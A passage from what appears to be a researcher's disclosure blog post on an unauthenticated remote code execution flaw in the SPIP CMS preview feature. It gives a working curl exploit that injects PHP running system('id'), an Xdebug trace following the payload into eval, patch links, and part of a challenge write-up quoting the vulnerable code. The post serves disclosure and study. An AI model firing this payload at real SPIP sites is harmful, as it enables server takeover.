<span class="hljs-comment"># plugins-dist/textwheel/inc/lien.php:    # Penser au cas [&lt;imgXX|right&gt;-&gt;URL], qui exige typo('&lt;a&gt;...&lt;/a&gt;')</span>
<span class="hljs-comment"># plugins-dist/textwheel/tests/data/typo/inline_link.txt:[&lt;code&gt;link avec de la typo !&lt;/code&gt;-&gt;http://example.com]</span>
<span class="hljs-comment"># plugins-dist/textwheel/tests/data/typo/inline_link_title.txt:[link|title with &lt;b&gt;bold avec de la typo!&lt;/b&gt;-&gt;http://example.com] and [another link|title with &lt;b&gt;bold avec de la typo!&lt;/b&gt;-&gt;/tests/]</span>
<span class="hljs-comment"># plugins-dist/textwheel/tests/data/modeles_inline/inline_link.txt:[link &lt;textwheel1|inline&gt;-&gt;http://example.com] and [another link &lt;textwheel1|inline&gt;-&gt;/tests/]</span>
<span class="hljs-comment"># plugins-dist/textwheel/tests/data/modeles_inline/inline_link.txt:[&lt;code&gt;link &lt;textwheel1|inline&gt;&lt;/code&gt;-&gt;http://example.com]</span>
<span class="hljs-comment"># plugins-dist/textwheel/tests/data/modeles_inline/inline_link.txt:[&lt;textwheel1|inline&gt;-&gt;http://example.com]</span>
<span class="hljs-comment"># plugins-dist/textwheel/tests/data/modeles_inline/inline_link.txt:[&lt;textwheel1|inline&gt; and text &lt;textwheel1|inline&gt;-&gt;http://example.com]</span>
<span class="hljs-comment"># plugins-dist/textwheel/tests/data/modeles_inline/inline_link_title.txt:[link|title &lt;textwheel1|inline&gt;-&gt;http://example.com] and [another link|title &lt;textwheel1|inline&gt;-&gt;/tests/]</span>
<span class="hljs-comment"># plugins-dist/textwheel/tests/data/modeles_inline/inline_link_title.txt:[link|title with &lt;b&gt;bold &lt;textwheel1|inline&gt;&lt;/b&gt;-&gt;http://example.com] and [another link|title with &lt;b&gt;bold &lt;textwheel1|inline&gt;&lt;/b&gt;-&gt;/tests/]</span>
<span class="hljs-comment"># plugins-dist/textwheel/tests/data/base/inline_link.txt:[&lt;code&gt;link&lt;/code&gt;-&gt;http://example.com]</span>
<span class="hljs-comment"># plugins-dist/textwheel/tests/data/base/inline_link_title.txt:[link|title with &lt;b&gt;bold&lt;/b&gt;-&gt;http://example.com] and [another link|title with &lt;b&gt;bold&lt;/b&gt;-&gt;/tests/]</span>
<span class="hljs-comment"># plugins-dist/textwheel/tests/data/modeles_block/inline_link.txt:[link &lt;textwheel1|block&gt;-&gt;http://example.com] and [another link &lt;textwheel1|block&gt;-&gt;/tests/]</span>
<span class="hljs-comment"># plugins-dist/textwheel/tests/data/modeles_block/inline_link.txt:[&lt;code&gt;link &lt;textwheel1|block&gt;&lt;/code&gt;-&gt;http://example.com]</span>
<span class="hljs-comment"># plugins-dist/textwheel/tests/data/modeles_block/inline_link.txt:[&lt;textwheel1|block&gt;-&gt;http://example.com]</span>
<span class="hljs-comment"># plugins-dist/textwheel/tests/data/modeles_block/inline_link.txt:[&lt;textwheel1|block&gt; and text &lt;textwheel1|block&gt;-&gt;http://example.com]</span>
<span class="hljs-comment"># plugins-dist/textwheel/tests/data/modeles_block/inline_link_title.txt:[link|title &lt;textwheel1|block&gt;-&gt;http://example.com] and [another link|title &lt;textwheel1|block&gt;-&gt;/tests/]</span>
</code></pre>

<p>The previsualisation system is the same (or very similar) for post and comments. One easy way to get intimate with it is to play on the article redaction page.</p>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/article-redaction-page.png" alt=""></p>

<p>In here, we have the document uploader, possibility to insert documents by id, links, slugs, bold, italics, quoted, striked, code blocks, and more.</p>

<p>Turns out reflecting URLs with complex formatting is broken when the right suite of filters is applied! By writing a dead-simple fuzzer to submit all kinds of urls and formats, and logging the content passed to the previously mentioned eval statement, things got lit!</p>

<p>I won’t give every working payload here, but let’s analyze one</p>

<pre><code class="language-php hljs">[&lt;img111111&gt;-&gt;URL`<span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">"id"</span>);<span class="hljs-meta">?&gt;</span>`]
</code></pre>

<p>This is a:</p>

<ul>
<li><code>[foo-&gt;bar]</code>            # Link seen as foo, pointing on bar</li>
<li><code>&lt;img111111&gt;</code>           # Resolve request to a non-existing image of id 111111</li>
<li>text            # Bold text</li>
<li><code>&lt;?php system("id");?&gt;</code> # Php payload that executes the id command</li>
</ul>

<p>So we have a link, made from a non-existing document, for which the slug contains a <strong>bold</strong> php payload!</p>

<h2 id="what-s-the-sploit">What’s the sploit?</h2>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/curl-exploit.png" alt=""></p>

<pre><code class="language-bash hljs">curl -sSkiL <span class="hljs-string">'http://0.0.0.0:8000/index.php?action=porte_plume_previsu'</span> -X POST -d <span class="hljs-string">'data=AA_[&lt;img111111&gt;-&gt;URL`&lt;?php system("id");?&gt;`]_BB'</span>
</code></pre>

<p>We’re therefore abusing the unauth previsualization feature to reflect our terrific bb-text-like url that will keep the payload untouched due to the path formatting takes!</p>

<h2 id="what-s-the-patch">What’s the patch?</h2>

<p>This led to two patches, one in the core, and one in the porte_plume plugin!</p>

<ul>
<li>In the Core:

<ul>
<li>Urls got their own filtering function for templating</li>
<li><a href="https://git.spip.net/spip/spip/-/merge_requests/5973/diffs">https://git.spip.net/spip/spip/-/merge_requests/5973/diffs</a></li>
</ul></li>
<li>In the Porte Plume plugin:

<ul>
<li>Access Control has been added for model previsualisation from an unauth context</li>
<li><a href="https://git.spip.net/spip/porte_plume/-/commit/97f9d6dddcadc9a01b098ec3552e204ce1c7a2ab">https://git.spip.net/spip/porte_plume/-/commit/97f9d6dddcadc9a01b098ec3552e204ce1c7a2ab</a></li>
</ul></li>
</ul>

<blockquote>
<p>Side note here, I’ve had past disclosure that went… Not so well.
This one was smooth, Spip Dev Team members were helpful and quick to react! 🌹</p>
</blockquote>

<h2 id="bonus-what-s-truly-happening-tracing-with-x-debug">BONUS: What’s truly happening? Tracing with X-debug!</h2>

<pre><code class="language-bash hljs">pecl install xdebug
mkdir /tmp/traces/
cat &gt;&gt; $(php --ini | grep -ioP <span class="hljs-string">"/.*/php.ini"</span>) &lt;&lt; EOF
zend_extension=xdebug.so
xdebug.mode = trace
xdebug.start_with_request = yes
xdebug.trace_format = 1  ; Use the computer-readable format
xdebug.output_dir = <span class="hljs-string">"/tmp/traces"</span>
EOF
<span class="hljs-comment"># Restart the php simple server</span>
php -S 0.0.0.0:8000
<span class="hljs-comment"># Then trigger the exploit</span>
curl -sSkiL <span class="hljs-string">'http://0.0.0.0:8000/index.php?action=porte_plume_previsu'</span> -X POST -d <span class="hljs-string">'data=AA&lt;doc1&gt;BB'</span>
<span class="hljs-comment"># Then inspect the trace</span>
gunzip /tmp/traces/trace.2713103059.xt.gz
bat /tmp/traces/trace.2713103059.xt
</code></pre>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/exploit-trace-bat.png" alt=""></p>

<p>The full trace can be found here: <a href="https://gist.github.com/laluka/609822f84ba07716c807be112b69e83a">https://gist.github.com/laluka/609822f84ba07716c807be112b69e83a</a></p>

<p>By snipping ✀ some parts, or just grepping on our payload, we’ll be able to find the exact culprits!</p>

<pre><code class="language-php hljs">[...] Framework initialization, autoload, boilerplate, ...
<span class="hljs-number">5</span>	<span class="hljs-number">43</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.010484</span>	<span class="hljs-number">569784</span>	serialize	<span class="hljs-number">0</span>		/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/config/ecran_securite.php	<span class="hljs-number">412</span>	<span class="hljs-number">1</span>	[<span class="hljs-string">'action'</span> =&gt; <span class="hljs-string">'porte_plume_previsu'</span>, <span class="hljs-string">'data'</span> =&gt; <span class="hljs-string">'AA_[&lt;img111111&gt;-&gt;URL`&lt;?php system("id");?&gt;`]_BB'</span>]
[...] Assempling many assets
<span class="hljs-number">22</span>	<span class="hljs-number">3094</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.147165</span>	<span class="hljs-number">7099656</span>	function_exists	<span class="hljs-number">0</span>		/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/ecrire/<span class="hljs-keyword">public</span>/assembler.php	<span class="hljs-number">559</span>	<span class="hljs-number">1</span>	<span class="hljs-string">'medias_modeles_styliser'</span>
[...] Tons of SQL &amp; data loading
<span class="hljs-number">14</span>	<span class="hljs-number">5393</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.201983</span>	<span class="hljs-number">7799240</span>	pipeline	<span class="hljs-number">1</span>		/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/plugins-dist/textwheel/inc/texte.php	<span class="hljs-number">914</span>	<span class="hljs-number">2</span>	<span class="hljs-string">'post_echappe_html_propre'</span>	<span class="hljs-string">'&lt;p&gt;AA_&lt;a href="URL&lt;code class="spip_code spip_code_inline" dir="ltr"&gt;&lt;span class="base64php29041280866b34eef8d1b72.80300957" title="PD9waHAgc3lzdGVtKCJpZCIpOz8+"&gt;&lt;/span&gt;&lt;/code&gt;" class=""&gt;&lt;/a&gt;_BB&lt;/p&gt;'</span>
<span class="hljs-number">15</span>	<span class="hljs-number">5394</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.202012</span>	<span class="hljs-number">7799240</span>	strtolower	<span class="hljs-number">0</span>		/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/ecrire/inc/utils.php	<span class="hljs-number">301</span>	<span class="hljs-number">1</span>	<span class="hljs-string">'post_echappe_html_propre'</span>
<span class="hljs-number">15</span>	<span class="hljs-number">5395</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.202030</span>	<span class="hljs-number">7799320</span>	function_exists	<span class="hljs-number">0</span>		/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/ecrire/inc/utils.php	<span class="hljs-number">302</span>	<span class="hljs-number">1</span>	<span class="hljs-string">'execute_pipeline_post_echappe_html_propre'</span>
<span class="hljs-number">15</span>	<span class="hljs-number">5396</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.202047</span>	<span class="hljs-number">7799352</span>	execute_pipeline_post_echappe_html_propre	<span class="hljs-number">1</span>		/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/ecrire/inc/utils.php	<span class="hljs-number">303</span>	<span class="hljs-number">1</span>	<span class="hljs-string">'&lt;p&gt;AA_&lt;a href="URL&lt;code class="spip_code spip_code_inline" dir="ltr"&gt;&lt;span class="base64php29041280866b34eef8d1b72.80300957" title="PD9waHAgc3lzdGVtKCJpZCIpOz8+"&gt;&lt;/span&gt;&lt;/code&gt;" class=""&gt;&lt;/a&gt;_BB&lt;/p&gt;'</span>
<span class="hljs-number">14</span>	<span class="hljs-number">5397</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.202078</span>	<span class="hljs-number">7799992</span>	pipeline	<span class="hljs-number">1</span>		/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/plugins-dist/textwheel/inc/texte.php	<span class="hljs-number">922</span>	<span class="hljs-number">2</span>	<span class="hljs-string">'post_echappe_html_propre_args'</span>	[<span class="hljs-string">'args'</span> =&gt; [<span class="hljs-string">'args'</span> =&gt; [...], <span class="hljs-string">'connect'</span> =&gt; <span class="hljs-keyword">NULL</span>, <span class="hljs-string">'env'</span> =&gt; [...]], <span class="hljs-string">'data'</span> =&gt; <span class="hljs-string">'&lt;p&gt;AA_&lt;a href="URL&lt;code class="spip_code spip_code_inline" dir="ltr"&gt;&lt;span class="base64php29041280866b34eef8d1b72.80300957" title="PD9waHAgc3lzdGVtKCJpZCIpOz8+"&gt;&lt;/span&gt;&lt;/code&gt;" class=""&gt;&lt;/a&gt;_BB&lt;/p&gt;'</span>]
[...] Entering the Clean-Up Pipeline
<span class="hljs-number">13</span>	<span class="hljs-number">5401</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.202175</span>	<span class="hljs-number">7798928</span>	echappe_retour	<span class="hljs-number">1</span>		/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/plugins-dist/porte_plume/porte_plume_fonctions.php	<span class="hljs-number">867</span>	<span class="hljs-number">3</span>	<span class="hljs-string">'&lt;p&gt;AA_&lt;a href="URL&lt;code class="spip_code spip_code_inline" dir="ltr"&gt;&lt;span class="base64php29041280866b34eef8d1b72.80300957" title="PD9waHAgc3lzdGVtKCJpZCIpOz8+"&gt;&lt;/span&gt;&lt;/code&gt;" class=""&gt;&lt;/a&gt;_BB&lt;/p&gt;'</span>	<span class="hljs-string">'php29041280866b34eef8d1b72.80300957'</span>	<span class="hljs-string">'traitements_previsu_php_modeles_eval'</span>
[...] Below us URL attrs extraction with extraire_attribut
<span class="hljs-number">14</span>	<span class="hljs-number">5404</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.202243</span>	<span class="hljs-number">7799088</span>	preg_match_all	<span class="hljs-number">0</span>		/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/ecrire/inc/texte_mini.php	<span class="hljs-number">316</span>	<span class="hljs-number">4</span>	<span class="hljs-string">',&lt;(span|div)\\sclass=[\'"]base64php29041280866b34eef8d1b72.80300957[\'"]\\s(.*)&gt;\\s*&lt;/\\1&gt;,UmsS'</span>	<span class="hljs-string">'&lt;p&gt;AA_&lt;a href="URL&lt;code class="spip_code spip_code_inline" dir="ltr"&gt;&lt;span class="base64php29041280866b34eef8d1b72.80300957" title="PD9waHAgc3lzdGVtKCJpZCIpOz8+"&gt;&lt;/span&gt;&lt;/code&gt;" class=""&gt;&lt;/a&gt;_BB&lt;/p&gt;'</span>	<span class="hljs-keyword">NULL</span>	<span class="hljs-number">2</span>
<span class="hljs-number">14</span>	<span class="hljs-number">5405</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.202281</span>	<span class="hljs-number">7799936</span>	extraire_attribut	<span class="hljs-number">1</span>		/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/ecrire/inc/texte_mini.php	<span class="hljs-number">321</span>	<span class="hljs-number">3</span>	<span class="hljs-string">'&lt;span class="base64php29041280866b34eef8d1b72.80300957" title="PD9waHAgc3lzdGVtKCJpZCIpOz8+"&gt;&lt;/span&gt;'</span>	<span class="hljs-string">'title'</span>	???
<span class="hljs-number">15</span>	<span class="hljs-number">5407</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.202320</span>	<span class="hljs-number">7800160</span>	preg_match	<span class="hljs-number">0</span>		/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/ecrire/inc/filtres.php	<span class="hljs-number">1951</span>	<span class="hljs-number">3</span>	<span class="hljs-string">',(^.*?&lt;(?:(?&gt;\\s*)(?&gt;[\\w:.-]+)(?&gt;(?:=(?:"[^"]*"|\'[^\']*\'|[^\'"]\\S*))?))*?)(\\s+title(?:=\\s*("[^"]*"|\'[^\']*\'|[^\'"]\\S*))?)()((?:[\\s/][^&gt;]*)?&gt;.*),isS'</span>	<span class="hljs-string">'&lt;span class="base64php29041280866b34eef8d1b72.80300957" title="PD9waHAgc3lzdGVtKCJpZCIpOz8+"&gt;&lt;/span&gt;'</span>	<span class="hljs-keyword">NULL</span>
<span class="hljs-number">15</span>	<span class="hljs-number">5408</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.202355</span>	<span class="hljs-number">7800712</span>	substr	<span class="hljs-number">0</span>		/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/ecrire/inc/filtres.php	<span class="hljs-number">1955</span>	<span class="hljs-number">3</span>	<span class="hljs-string">'"PD9waHAgc3lzdGVtKCJpZCIpOz8+"'</span>	<span class="hljs-number">1</span>	<span class="hljs-number">-1</span>
<span class="hljs-number">15</span>	<span class="hljs-number">5410</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.202394</span>	<span class="hljs-number">7800712</span>	filtrer_entites	<span class="hljs-number">1</span>		/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/ecrire/inc/filtres.php	<span class="hljs-number">1967</span>	<span class="hljs-number">1</span>	<span class="hljs-string">'PD9waHAgc3lzdGVtKCJpZCIpOz8+'</span>
<span class="hljs-number">14</span>	<span class="hljs-number">5412</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.202436</span>	<span class="hljs-number">7799992</span>	base64_decode	<span class="hljs-number">0</span>		/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/ecrire/inc/texte_mini.php	<span class="hljs-number">321</span>	<span class="hljs-number">1</span>	<span class="hljs-string">'PD9waHAgc3lzdGVtKCJpZCIpOz8+'</span>
<span class="hljs-number">14</span>	<span class="hljs-number">5413</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.202454</span>	<span class="hljs-number">7799992</span>	extraire_attribut	<span class="hljs-number">1</span>		/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/ecrire/inc/texte_mini.php	<span class="hljs-number">325</span>	<span class="hljs-number">3</span>	<span class="hljs-string">'&lt;span class="base64php29041280866b34eef8d1b72.80300957" title="PD9waHAgc3lzdGVtKCJpZCIpOz8+"&gt;&lt;/span&gt;'</span>	<span class="hljs-string">'lang'</span>	???
<span class="hljs-number">14</span>	<span class="hljs-number">5415</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.202498</span>	<span class="hljs-number">7799992</span>	extraire_attribut	<span class="hljs-number">1</span>		/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/ecrire/inc/texte_mini.php	<span class="hljs-number">325</span>	<span class="hljs-number">3</span>	<span class="hljs-string">'&lt;span class="base64php29041280866b34eef8d1b72.80300957" title="PD9waHAgc3lzdGVtKCJpZCIpOz8+"&gt;&lt;/span&gt;'</span>	<span class="hljs-string">'dir'</span>	???
<span class="hljs-number">14</span>	<span class="hljs-number">5417</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.202540</span>	<span class="hljs-number">7799992</span>	traitements_previsu_php_modeles_eval	<span class="hljs-number">1</span>		/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/ecrire/inc/texte_mini.php	<span class="hljs-number">336</span>	<span class="hljs-number">1</span>	<span class="hljs-string">'&lt;?php system("id");?&gt;'</span>
<span class="hljs-number">15</span>	<span class="hljs-number">5418</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.202554</span>	<span class="hljs-number">7799992</span>	ob_start	<span class="hljs-number">0</span>		/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/plugins-dist/porte_plume/porte_plume_fonctions.php	<span class="hljs-number">884</span>	<span class="hljs-number">0</span>
<span class="hljs-number">15</span>	<span class="hljs-number">5419</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.202588</span>	<span class="hljs-number">7817368</span>	<span class="hljs-keyword">eval</span>	<span class="hljs-number">1</span>	<span class="hljs-string">'?&gt;&lt;?php system("id");?&gt;'</span>	/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/plugins-dist/porte_plume/porte_plume_fonctions.php	<span class="hljs-number">886</span>	<span class="hljs-number">0</span>
<span class="hljs-number">16</span>	<span class="hljs-number">5420</span>	<span class="hljs-number">0</span>	<span class="hljs-number">0.202603</span>	<span class="hljs-number">7817368</span>	system	<span class="hljs-number">0</span>		/opt/spip-rampage<span class="hljs-number">-2024</span>/sources/plugins-dist/porte_plume/porte_plume_fonctions.php(<span class="hljs-number">886</span>) : <span class="hljs-keyword">eval</span>()<span class="hljs-string">'d code	1	1	'</span>id<span class="hljs-string">'
</span></code></pre>

<h2 id="bonus-unauth-rce-on-spip-so-you-broke-root-me-again">BONUS: Unauth RCE on Spip… So you broke root-me again?</h2>

<p>Well, hum… 👉👈 No. 😭</p>

<p>The issue has been introduced a year ago, and <code>Root-Me is working on a rework</code>! 🥳<br>
Therefore they did not spend time updating their Spip instance for over a year…</p>

<p>So, this time, a lack of updates definitely helped for security!<br>
Feels like <a href="https://flast101.github.io/php-8.1.0-dev-backdoor-rce/">php-8.1.0-dev backdoor</a>, right? 🙃</p>

<p>But next article will cover <code>Yet Another Unauth RCE</code> that this time worked on <a href="https://www.root-me.org/">Root-Me.org</a>, so I hope you enjoyed this one, and will kindly wait for the next one! 💌</p>

<blockquote>
<p>Have a nice Summer everyone! 🌻</p>
</blockquote>

<h2 id="appendix-summer-spip-challenge">APPENDIX: Summer Spip Challenge!</h2>

<blockquote>
<p>As this article was soon to be disclosed, I thought making a chall out of it could be appreciated.<br>
And it definitely did!</p>
</blockquote>


<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/Cy9pi2BhHXM.html" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen="" title="YouTube Video"></iframe>
</div>


<p><img class="img_med" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/summer-spip-challenge-tweet.png" alt=""></p>

<p>Here’s the TL;DR, then we’ll move to the player writeups! 🎉</p>

<ul>
<li>15+ folks contacted to assess ideas, find out if they were on the right track</li>
<li>7 found the right sink (<a href="https://x.com/Chocapikk_">@Chocapikk_</a> first), but were struggling to bypass the <code>_PROTEGE_PHP_MODELES</code> check</li>
<li>4 have proved to have working payloads “assuming this check is passed”</li>
<li>3 Solved the challenge! 🔓

<ul>
<li>The initial winners are <a href="https://x.com/Vozec1">@Vozec1</a> &amp; <a href="https://x.com/_Worty">@_Worty</a> (collab)</li>
<li>Then <a href="https://x.com/GuilhemRioux">@GuilhemRioux</a> joined them with a funky payload!</li>
</ul></li>
</ul>

<hr>

<h3 id="winner-write-up-from-vozec1-worty">Winner Write-Up from <strong>@Vozec1</strong> &amp; <strong>@_Worty</strong></h3>

<p>The <code>Porte Plume</code> plugin code is fairly short, only a few hundred lines.<br>
As a result, interesting functions were quickly identified.</p>

<p>The ones that first caught our attention were the <code>traitements_previsu</code> and <code>traitements_previsu_php_modeles_eval</code> functions, since they themselves use the notoriously dangerous “eval” function.</p>

<pre><code class="language-php hljs"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">traitements_previsu</span><span class="hljs-params">($texte, $nom_champ = <span class="hljs-string">''</span>, $type_objet = <span class="hljs-string">''</span>, $connect = null)</span> </span>{
	include_spip(<span class="hljs-string">'public/interfaces'</span>); <span class="hljs-comment">// charger les traitements</span>

	<span class="hljs-keyword">global</span> $table_des_traitements;
	<span class="hljs-keyword">if</span> (!strlen($nom_champ) || !<span class="hljs-keyword">isset</span>($table_des_traitements[$nom_champ])) {
		$texte = propre($texte, $connect);
	} <span class="hljs-keyword">else</span> {
		include_spip(<span class="hljs-string">'base/abstract_sql'</span>);
		$table = table_objet($type_objet);
		$ps = $table_des_traitements[$nom_champ];
		<span class="hljs-keyword">if</span> (is_array($ps)) {
			$ps = $ps[(strlen($table) &amp;&amp; <span class="hljs-keyword">isset</span>($ps[$table])) ? $table : <span class="hljs-number">0</span>];
		}
		<span class="hljs-keyword">if</span> (!$ps) {
			$texte = propre($texte, $connect);
		} <span class="hljs-keyword">else</span> {
			<span class="hljs-comment">// [FIXME] Éviter une notice sur le eval suivant qui ne connait</span>
			<span class="hljs-comment">// pas la Pile ici. C'est pas tres joli...</span>
			$Pile = [<span class="hljs-number">0</span> =&gt; []];
			<span class="hljs-comment">// remplacer le placeholder %s par le texte fourni</span>
			<span class="hljs-keyword">eval</span>(<span class="hljs-string">'$texte='</span> . str_replace(<span class="hljs-string">'%s'</span>, <span class="hljs-string">'$texte'</span>, $ps) . <span class="hljs-string">';'</span>);
		}
	}

	<span class="hljs-comment">// si il y a du PHP issu de modeles, il faut l'eval ici, car on aura pas de eval final contrairement aux pages SPIP</span>
	<span class="hljs-keyword">if</span> (defined(<span class="hljs-string">'_PROTEGE_PHP_MODELES'</span>)) {
		$texte = echappe_retour($texte, <span class="hljs-string">'php'</span> . _PROTEGE_PHP_MODELES, <span class="hljs-string">'traitements_previsu_php_modeles_eval'</span>);
	}

	<span class="hljs-comment">// il faut toujours securiser le texte prévisualisé car il peut contenir n'importe quoi</span>
	<span class="hljs-comment">// et servir de support a une attaque xss ou vol de cookie admin</span>
	<span class="hljs-comment">// on ne peut donc se fier au statut de l'auteur connecté car le contenu ne vient pas</span>
	<span class="hljs-comment">// forcément de lui</span>
	<span class="hljs-keyword">return</span> safehtml($texte);
}
</code></pre>

<p>and :</p>

<pre><code class="language-php hljs"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">traitements_previsu_php_modeles_eval</span><span class="hljs-params">($php)</span> </span>{
	ob_start();
	<span class="hljs-keyword">try</span> {
		$res = <span class="hljs-keyword">eval</span>(<span class="hljs-string">'?'</span> . <span class="hljs-string">'&gt;'</span> . $php);
		$texte = ob_get_contents();
	} <span class="hljs-keyword">catch</span> (\Throwable $e) {
		$texte = <span class="hljs-string">'&lt;!-- Erreur --&gt;'</span>;
	}
	ob_end_clean();
	<span class="hljs-keyword">return</span> $texte;
}
</code></pre>

<p>As explained above, <em>Porte Plume</em> is grafted onto the various editing fields of the spip application.
It’s the preview system that will call our two functions.
As described in the comments, these functions are used to apply filters to user input.
<em>(Note that Spip will add its security filter on top of this)</em>.</p>

<h3 id="first-approaches-to-previewing">First approaches to previewing:</h3>

<p>The preview function, authenticated or non-authenticated, takes 3 parameters:</p>

<ul>
<li>champ</li>
<li>objet</li>
<li>data</li>
</ul>

<p>Depending on <code>field</code> and <code>object</code>, different filters are applied to <code>data</code> and the result is displayed in the following SPIP template:</p>

<pre><code class="language-html hljs xml">#CACHE{0}
[(#HTTP_HEADER{Content-Type: text/html; charset=[(#VAL|pp_charset)]})]
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"preview"</span>&gt;</span>
[(#ENV*{data}|traitements_previsu{#ENV*{champ},#ENV*{objet}}|image_reduire{500,0}|liens_absolus)]
[<span class="hljs-tag">&lt;<span class="hljs-name">hr</span> <span class="hljs-attr">style</span>=<span class="hljs-string">'clear:both;'</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"notes"</span>&gt;</span>(#NOTES)<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>]
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>

<p>These filters are contained in the table: <code>$table_des_traitements</code>, the php code will then retrieve this filter and apply it:</p>

<pre><code class="language-php hljs">$ps = $table_des_traitements[$nom_champ];
...
<span class="hljs-keyword">eval</span>(<span class="hljs-string">'$texte='</span> . str_replace(<span class="hljs-string">'%s'</span>, <span class="hljs-string">'$texte'</span>, $ps) . <span class="hljs-string">';'</span>);
</code></pre>

<p>Here are the possible filters, from <code>json_encode($table_of_treatments)</code>’ output</p>

<pre><code class="language-json hljs">{
    <span class="hljs-attr">"BIO"</span>: [<span class="hljs-string">"safehtml(propre(%s, $connect, $Pile[0]))"</span>],
    <span class="hljs-attr">"NOM_SITE"</span>: {
        <span class="hljs-attr">"auteurs"</span>: <span class="hljs-string">"entites_html(%s)"</span>,
        <span class="hljs-attr">"forums"</span>: <span class="hljs-string">"liens_nofollow(safehtml(typo(interdit_html(%s), \"TYPO\", $connect, $Pile[0])))"</span>,
        <span class="hljs-attr">"0"</span>: <span class="hljs-string">"typo(%s, \"TYPO\", $connect, $Pile[0])"</span>
    },
    <span class="hljs-attr">"NOM"</span>: {
        <span class="hljs-attr">"auteurs"</span>: <span class="hljs-string">"safehtml(supprimer_numero(typo(%s, \"TYPO\", $connect, $Pile[0])))"</span>,
        <span class="hljs-attr">"0"</span>: <span class="hljs-string">"supprimer_numero(typo(%s, \"TYPO\", $connect, $Pile[0]))"</span>
    },
    <span class="hljs-attr">"CHAPO"</span>: [<span class="hljs-string">"propre(%s, $connect, $Pile[0])"</span>],
    <span class="hljs-attr">"DATE"</span>: [<span class="hljs-string">"normaliser_date(%s)"</span>],
    <span class="hljs-attr">"DATE_REDAC"</span>: [<span class="hljs-string">"normaliser_date(%s)"</span>],
    <span class="hljs-attr">"DATE_MODIF"</span>: [<span class="hljs-string">"normaliser_date(%s)"</span>],
    <span class="hljs-attr">"DATE_NOUVEAUTES"</span>: [<span class="hljs-string">"normaliser_date(%s)"</span>],
    <span class="hljs-attr">"DESCRIPTIF"</span>: {
        <span class="hljs-attr">"0"</span>: <span class="hljs-string">"propre(%s, $connect, $Pile[0])"</span>,
        <span class="hljs-attr">"syndic_articles"</span>: <span class="hljs-string">"safehtml(%s)"</span>
    },
    <span class="hljs-attr">"INTRODUCTION"</span>: [<span class="hljs-string">"propre(%s, $connect, $Pile[0])"</span>],
    <span class="hljs-attr">"NOM_SITE_SPIP"</span>: [<span class="hljs-string">"typo(%s, \"TYPO\", $connect, $Pile[0])"</span>],
    <span class="hljs-attr">"AUTEUR"</span>: {
        <span class="hljs-attr">"0"</span>: <span class="hljs-string">"typo(%s, \"TYPO\", $connect, $Pile[0])"</span>,
        <span class="hljs-attr">"forums"</span>: <span class="hljs-string">"liens_nofollow(safehtml(vider_url(%s)))"</span>
    },
    <span class="hljs-attr">"PS"</span>: [<span class="hljs-string">"propre(%s, $connect, $Pile[0])"</span>],
    <span class="hljs-attr">"SOURCE"</span>: {
        <span class="hljs-attr">"0"</span>: <span class="hljs-string">"typo(%s, \"TYPO\", $connect, $Pile[0])"</span>,
        <span class="hljs-attr">"syndic_articles"</span>: <span class="hljs-string">"safehtml(%s)"</span>
    },
    <span class="hljs-attr">"SOUSTITRE"</span>: [<span class="hljs-string">"typo(%s, \"TYPO\", $connect, $Pile[0])"</span>],
    <span class="hljs-attr">"SURTITRE"</span>: [<span class="hljs-string">"typo(%s, \"TYPO\", $connect, $Pile[0])"</span>],
    <span class="hljs-attr">"TAGS"</span>: {
        <span class="hljs-attr">"0"</span>: <span class="hljs-string">"%s"</span>,
